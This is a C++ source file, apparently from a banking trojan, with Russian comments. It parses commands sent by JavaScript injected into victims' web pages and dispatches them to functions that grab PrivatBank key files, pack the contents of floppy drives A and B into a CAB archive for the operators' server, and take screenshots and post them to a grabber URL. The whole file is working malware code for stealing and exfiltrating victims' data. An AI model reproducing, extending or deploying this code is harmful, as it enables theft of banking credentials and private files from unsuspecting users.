//---------------------------------------------------------------------------

#pragma hdrstop

#include "HTMLInjectsScriptAdapter.h"
//---------------------------------------------------------------------------

#include "Strings.h"
#include "Utils.h"
#include "Loader.h"
#include "CabPacker.h"
#include "StrConsts.h"
#include "Splice.h"
#include "GetApi.h"
#include "ScreenShots.h"
#include "BotHTTP.h"

#include "Modules.h"

void SendPrivatBankKey(const char* Command, const char* Params);
void SendFloppyDiskToServer(const char* Command, const char* Params);
void SendSendScreenshot(const char* Command, const char* Params);



typedef void (*THTMLInjectRequestCommand)(const char* Command, const char* Params);



//----------------------------------------------------------
//  ProcessHTMLInjectRequest - Функция обрабатывает адрес
//  запроса и, в случае если это обращение из ява скрипта
//  внедрённого в страницу, выполняет необходимые действия
//
//  URL - Обрабатываемый адрес
//
//  CloseRequest - Функция установит параметр в истину,
//                 если запрос обработан и дальше не стоит
//                 его пропускать
//----------------------------------------------------------
bool ProcessHTMLInjectRequest(const char* URL, bool DecodeParam, bool* CloseRequest)
{
  

	if (CloseRequest)
		*CloseRequest = false;  

	if (STRA::IsEmpty(URL))
		return false;

	// Определяем имя команды
	int Pos = STRA::Pos(URL, "://");
	if (Pos >= 0)
		URL += Pos + 3;

	// Пропускаем имя домена
	URL = STRA::Scan(URL, '/');
	if (!URL) return false;
	URL++;


	// Определяем начало строки параметров
	PCHAR Params = STRA::Scan(URL, '/');

	// Определяем длину команды
	int CmdLen = (Params) ? (Params - URL) : STRA::Length(URL);


	// в случае остутствия данных в домене FireFox автоматически
	// дополняет команду строками www и .com
	// т.е. наша команда получает вид www.command.com
 

	// Обрабатываем команду
	if (Params) Params++;

	DWORD CmdHash = STRA::Hash(URL, CmdLen, true);

	bool DecodeFromUTF8 = true;

	// Проверяем хэш команды
	THTMLInjectRequestCommand Command = NULL;

	if (CmdHash == 0x9E19D547 /* keypath */)
		Command = SendPrivatBankKey;
	else
	if (CmdHash == 0x3D78E9CE /* dusketa */)
		Command = SendFloppyDiskToServer;
	else
	if (CmdHash == 0xDF8EE546 /* makescreen */)
	{
		Command = SendSendScreenshot;
		DecodeFromUTF8 = false;
	}


	// Выполняем команду
	bool Result = false;  
	if (Command)
	{
		Result = true;
		if (CloseRequest) *CloseRequest = true; 

		string CmdStr;
		CmdStr.Copy(URL, 0, CmdLen);

		// Преобразовываем из UTF8 в Ansi
		string EP = URLDecode(Params);

		if (DecodeFromUTF8)
		{
			PCHAR P = UTF8ToAnsi(EP.t_str());
			EP = P;
			STR::Free(P);
		}

//		string F;
//		F.Format("Выполняется команда инжекта: %s; Параметры: %s", CmdStr.t_str(), EP.t_str());
//		pMessageBoxA(0, F.t_str(), 0, 0);
//		pOutputDebugStringA(F.t_str());

		Command(CmdStr.t_str(), EP.t_str());
	}

	return Result;
}
//-----------------------------------------------------------------------------



//---------------------------------------------------
//  Функция отправляет файл ключа приватбанка
//---------------------------------------------------
void SendPrivatBankKey(const char* Command, const char* Params)
{
	if (!File::IsExists((PCHAR)Params))  
		return;       
    

#ifdef PrivatBankH
	TPrivatBank Privat;
	Privat.AddKeyFile(Params);
#endif


	// Добавляем фал в архив
//	string FN = File::GetTempName2A();
//
//	HCAB Cab = CreateCab(FN.t_str());
//	if (Cab)
//	{
//		PCHAR Name = File::ExtractFileNameA((PCHAR)Params, false);
//		bool Added = AddFileToCab(Cab, Params, Name);
//		CloseCab(Cab);
//
//		DataGrabber::SendCabDelayed(NULL, FN.t_str(), GetStr(EStrSystemPrivat).t_str());
//	}
//	pDeleteFileA(FN.t_str());
}
//-----------------------------------------------------------------------------


//---------------------------------------------------
//  Функция отправляет содержимое флоппидисков на
//  сервер админки
//---------------------------------------------------
void SendFloppyDiskToServer(const char* Command, const char* Params)
{
	string FN = File::GetTempName2A();
	HCAB Cab = CreateCab(FN.t_str());
	if (Cab)
	{
		DWORD EMode = (DWORD)pSetErrorMode(SEM_FAILCRITICALERRORS);

		// Добавляем диска "A" и "B" в каб
		bool Added = AddDirToCab(Cab, "a:\\", "drive_a");

		if (AddDirToCab(Cab, "b:\\", "drive_b"))
			Added = true;

		pSetErrorMode(EMode);

		CloseCab(Cab);

		if (Added)
			Added = DataGrabber::SendCabDelayed(NULL, FN.t_str(), GetStr(EStrCabNameDisketa).t_str());
	}
    pDeleteFileA(FN.t_str());
}
//-----------------------------------------------------------------------------



//-----------------------------------------------
//  Функция потока создания скриншота и отправки
//  его на сервер
//-----------------------------------------------
#ifdef AzConfigH
DWORD WINAPI DoSendSendScreenshot(string *Params)
{
	// Определяем имя системы
	string System;
	string Comment;
	PCHAR Start = STRA::Scan(Params->t_str(), '/');
	if (Start)
	{
		*Start = 0;
		Start++;
		System = Params->t_str();
		Comment = Start;
	}
	else
	{
		Comment = *Params;
		System  = "screens";
	}

	// Создаём скрин
    string FN = File::GetTempName2A();
	if (!ScreenShot::Make(0, 0, 0, 0, 0, NULL, FN.t_str()))
		return 0;

	// Отправляем запрос
	string URL = GetAzGrabberURL(System, "save_sf");
	if (!URL.IsEmpty())
	{
		TMultiPartData Data;
		Data.Add("txt", Comment);
		Data.AddFile("file", FN.t_str(), NULL, NULL);

		THTTP HTTP;
		HTTP.Post(URL.t_str(), &Data);
    }

	// Очищаем данные
	delete Params;
	pDeleteFileA(FN.t_str());
	return 0;
}
#endif


//-----------------------------------------------
//  SendSendScreenshot - Функция делает снимок
//  экрана и отправляет его на сервер
//-----------------------------------------------
void SendSendScreenshot(const char* Command, const char* Params)
{
	#ifdef AzConfigH
	StartThread(DoSendSendScreenshot, new string(Params));
	#endif
}
